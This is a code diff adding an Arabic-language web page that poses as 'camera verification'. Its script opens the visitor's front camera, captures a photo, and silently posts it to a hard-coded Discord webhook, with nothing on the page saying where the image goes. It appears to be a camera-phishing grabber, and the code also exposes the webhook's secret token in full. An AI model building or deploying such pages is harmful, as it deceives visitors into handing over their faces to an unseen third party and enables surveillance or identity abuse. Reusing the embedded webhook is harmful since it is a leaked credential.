@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التقاط صورة وإرسالها</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0f172a;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .card {
+      background-color: #1e293b;
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    video {
+      width: 100%;
+      max-height: 250px;
+      background-color: #000;
+      border-radius: 8px;
+      margin-top: 15px;
+      display: none; /* يظهر عند تشغيل الكاميرا */
+    }
+
+    button {
+      background-color: #38bdf8;
+      color: #0f172a;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 15px;
+    }
+
+    button:disabled {
+      background-color: #64748b;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      word-wrap: break-word;
+    }
+
+    canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h2>التحقق عبر الكاميرا</h2>
+    <p>اضغط على الزر أدناه لتفعيل الكاميرا والتقاط صورة.</p>
+
+    <video id="webcam" autoplay playsinline muted></video>
+    
+    <button id="actionBtn">تفعيل الكاميرا والتقاط</button>
+    <div id="status"></div>
+  </div>
+
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1556771079656054888/zHJECmFPu_m5EYwDeC8ECJkxmGo7ExcKRm1IBMyjFVoY2yi5LEjHKhUY-boTt1q3dCmi";
+
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const actionBtn = document.getElementById('actionBtn');
+    const statusDiv = document.getElementById('status');
+
+    actionBtn.addEventListener('click', async () => {
+      // التحقق أولاً إذا كان الموقع يعمل على بيئة آمنة
+      if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+        statusDiv.style.color = '#f87171';
+        statusDiv.innerText = "⚠️ خطأ: المتصفح يمنع الكاميرا لأن الموقع ليس على رابط آمن (HTTPS). يجب رفع الصفحة على استضافة تدعم HTTPS.";
+        return;
+      }
+
+      actionBtn.disabled = true;
+      statusDiv.style.color = '#38bdf8';
+      statusDiv.innerText = "جاري طلب إذن الكاميرا...";
+
+      try {
+        // طلب الكاميرا مع إعدادات واسعة النطاق للتوافق مع الهواتف والأجهزة المختلفة
+        const constraints = {
+          video: {
+            facingMode: "user", // استخدام الكاميرا الأمامية
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          }
+        };
+
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        video.style.display = 'block'; // إظهار شاشة الفيديو للمستخدم
+
+        statusDiv.innerText = "تم فتح الكاميرا.. جاري الالتقاط خلال ثانية واحدة...";
+
+        // الانتظار قليلاً لتأكيد جاهزية إطار الفيديو والسطوع
+        setTimeout(() => {
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // إيقاف بث الكاميرا بعد التقاط اللقطة
+          stream.getTracks().forEach(track => track.stop());
+          video.style.display = 'none';
+
+          statusDiv.innerText = "جاري إرسال الصورة...";
+
+          // تحويل الصورة إلى Blob وإرسالها
+          canvas.toBlob(async (blob) => {
+            if (!blob) {
+              statusDiv.style.color = '#f87171';
+              statusDiv.innerText = "فشل في معالجة الصورة.";
+              actionBtn.disabled = false;
+              return;
+            }
+
+            const formData = new FormData();
+            formData.append('file', blob, 'capture.png');
+            formData.append('payload_json', JSON.stringify({
+              username: "نظام التوثيق",
+              content: "📸 تم التقاط صورة جديدة من المستخدم."
+            }));
+
+            try {
+              const res = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+              });
+
+              if (res.ok) {
+                statusDiv.style.color = '#4ade80';
+                statusDiv.innerText = "✅ تم التقاط الصورة وإرسالها بنجاح!";
+              } else {
+                statusDiv.style.color = '#f87171';
+                statusDiv.innerText = "❌ حدث خطأ أثناء الإرسال إلى الديسكورد (رمز الاستجابة: " + res.status + ")";
+              }
+            } catch (netErr) {
+              statusDiv.style.color = '#f87171';
+              statusDiv.innerText = "❌ تعذر الاتصال بالسيرفر. تحقق من الاتصال أو رابط Webhook.";
+            }
+
+            actionBtn.disabled = false;
+          }, 'image/png');
+
+        }, 1500);
+
+      } catch (err) {
+        actionBtn.disabled = false;
+        statusDiv.style.color = '#f87171';
+        
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          statusDiv.innerText = "❌ تم رفض إذن الوصول للكاميرا من قبل المستخدم أو المتصفح.";
+        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
+          statusDiv.innerText = "❌ لم يتم العثور على كاميرا متصلة بالجهاز.";
+        } else {
+          statusDiv.innerText = "❌ تعذر فتح الكاميرا: " + err.message;
+        }
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
